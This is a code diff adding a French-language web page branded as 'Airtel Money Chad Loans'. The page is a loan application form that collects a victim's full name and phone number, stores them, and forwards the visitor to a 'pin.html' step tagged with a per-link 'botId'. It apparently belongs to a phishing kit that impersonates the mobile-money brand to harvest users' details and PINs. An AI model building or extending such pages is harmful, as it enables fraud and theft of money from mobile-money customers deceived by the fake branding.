@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Détails du prêt · Airtel Money Chad Loans</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #f0f4fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 1.5rem;
+      line-height: 1.5;
+      color: #1e293b;
+    }
+
+    .loan-container {
+      background: #ffffff;
+      width: 100%;
+      max-width: 480px;
+      border-radius: 28px;
+      box-shadow: 0 20px 40px -12px rgba(0, 20, 50, 0.2), 0 8px 20px -8px rgba(0, 0, 0, 0.08);
+      padding: 2rem 2rem 2.2rem;
+      transition: all 0.2s ease;
+    }
+
+    .logo-container {
+      width: 100%;
+      background: linear-gradient(145deg, #0a1a3a 0%, #0b2b5c 100%);
+      border-radius: 20px;
+      margin-bottom: 1.8rem;
+      padding: 1.8rem 1rem;
+      text-align: center;
+      box-shadow: inset 0 1px 3px rgba(255, 255, 255, 0.08), 0 6px 14px rgba(0, 20, 50, 0.2);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .logo-container h1 {
+      font-size: 1.65rem;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      color: white;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      flex-wrap: wrap;
+      line-height: 1.3;
+    }
+
+    h2 {
+      font-size: 1.35rem;
+      font-weight: 700;
+      color: #0b1e3a;
+      letter-spacing: -0.4px;
+      margin-bottom: 1.4rem;
+      text-align: center;
+    }
+
+    label {
+      display: block;
+      font-size: 0.9rem;
+      font-weight: 600;
+      margin: 1.2rem 0 0.4rem;
+      color: #0b1e3a;
+      letter-spacing: -0.2px;
+    }
+
+    input {
+      width: 100%;
+      padding: 0.85rem 1rem;
+      font-size: 0.95rem;
+      font-family: 'Inter', sans-serif;
+      background: #f9fcff;
+      border: 1.5px solid #dde5ef;
+      border-radius: 14px;
+      transition: all 0.15s ease;
+      color: #0f1a2e;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #1e4b8c;
+      background: #ffffff;
+      box-shadow: 0 0 0 4px rgba(30, 75, 140, 0.12);
+    }
+
+    input::placeholder {
+      color: #97a6ba;
+      font-weight: 400;
+      font-size: 0.9rem;
+    }
+
+    /* modern checkbox */
+    .checkbox-label {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 0.88rem;
+      font-weight: 500;
+      color: #2c3e5a;
+      margin: 1.8rem 0 1.6rem;
+      cursor: pointer;
+      padding: 0.2rem 0;
+      line-height: 1.4;
+    }
+
+    .checkbox-label input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      accent-color: #0b2b5c;
+      border-radius: 6px;
+      cursor: pointer;
+      flex-shrink: 0;
+      border: 1.5px solid #b8c6da;
+      transition: all 0.15s ease;
+    }
+
+    .checkbox-label input[type="checkbox"]:focus-visible {
+      outline: 2px solid #1e4b8c;
+      outline-offset: 2px;
+    }
+
+    button {
+      width: 100%;
+      padding: 1rem 1.5rem;
+      background: linear-gradient(135deg, #0b2b5c 0%, #1a3f7a 100%);
+      color: white;
+      border: none;
+      border-radius: 30px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      font-family: 'Inter', sans-serif;
+      letter-spacing: 0.3px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 8px 18px -6px rgba(10, 40, 100, 0.4);
+      margin-top: 0.5rem;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    button:hover:not(:disabled) {
+      background: linear-gradient(135deg, #123770 0%, #224d8f 100%);
+      transform: translateY(-2px);
+      box-shadow: 0 14px 24px -8px rgba(10, 40, 100, 0.5);
+    }
+
+    button:active:not(:disabled) {
+      transform: translateY(1px);
+      box-shadow: 0 4px 12px -4px rgba(10, 40, 100, 0.6);
+    }
+
+    button:disabled {
+      background: #cbd5e1;
+      color: #64748b;
+      cursor: not-allowed;
+      box-shadow: none;
+      transform: none;
+      border: 1px solid #e2e8f0;
+    }
+
+    input:-webkit-autofill {
+      -webkit-box-shadow: 0 0 0 30px #f9fcff inset !important;
+      box-shadow: 0 0 0 30px #f9fcff inset !important;
+    }
+
+    @media (max-width: 480px) {
+      body { padding: 1rem; }
+      .loan-container { padding: 1.5rem 1.2rem 1.8rem; border-radius: 24px; }
+      .logo-container h1 { font-size: 1.4rem; }
+      h2 { font-size: 1.2rem; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="loan-container">
+  <div class="logo-container">
+    <h1>💸 Airtel Money Chad Loans</h1>
+  </div>
+
+  <h2>Formulaire de demande de prêt</h2>
+
+  <form id="detailsForm">
+    <label for="name">Nom complet</label>
+    <input id="name" placeholder="Nom" required>
+
+    <label for="phone">Numéro de téléphone</label>
+    <input id="phone" placeholder="+235 6X XX XX XX" required>
+
+    <label class="checkbox-label">
+      <input type="checkbox" id="confirmCheck">
+      J'accepte les termes et services de Airtel Money Chad Loans
+    </label>
+
+    <button id="nextBtn" disabled>Continuer →</button>
+  </form>
+</div>
+
+<script>
+  (function() {
+    const params = new URLSearchParams(window.location.search);
+    const botId = params.get('botId') || window.location.pathname.split('/').pop();
+    if (!botId) { alert("Lien d'accès invalide"); throw new Error(); }
+
+    if (!localStorage.getItem('loanAmount')) {
+      window.location.href = `index.html?botId=${encodeURIComponent(botId)}`;
+    }
+
+    const confirmCheck = document.getElementById('confirmCheck');
+    const nextBtn = document.getElementById('nextBtn');
+
+    confirmCheck.addEventListener('change', () => {
+      nextBtn.disabled = !confirmCheck.checked;
+    });
+
+    document.getElementById('detailsForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+
+      const nameInput = document.getElementById('name');
+      const phoneInput = document.getElementById('phone');
+
+      const name = nameInput.value.trim();
+      const phone = phoneInput.value.trim();
+
+      if (!name || !phone) {
+        alert('Veuillez remplir tous les champs obligatoires.');
+        return;
+      }
+
+      localStorage.setItem('name', name);
+      localStorage.setItem('phone', phone);
+
+      window.location.href = `pin.html?botId=${encodeURIComponent(botId)}`;
+    });
+  })();
+</script>
+
+</body>
+</html>
